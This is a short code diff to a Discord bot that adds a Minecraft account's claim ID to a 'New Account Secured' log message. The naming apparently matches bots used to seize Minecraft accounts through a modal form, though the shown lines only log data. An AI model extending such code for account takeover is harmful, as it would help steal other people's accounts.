@@ -113,13 +113,13 @@ class MyModalTwo(ui.Modal):
 
         if self.config["claims"]["claims_enabled"]:
             name = securedAccount["minecraft"]["name"]
-            claim_id = 
+            claim_id = securedAccount["claim_id"]
 
             await send_logs(
                 interaction.client,
                 discord.Embed(
                     title="New Account Secured",
-                    description=f"**{name}** has been successfully secured.",
+                    description=f"**{name}** has been successfully secured.\nClaim ID is {claim_id}",
                     color=0x79D990
                 ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
                 conly = True
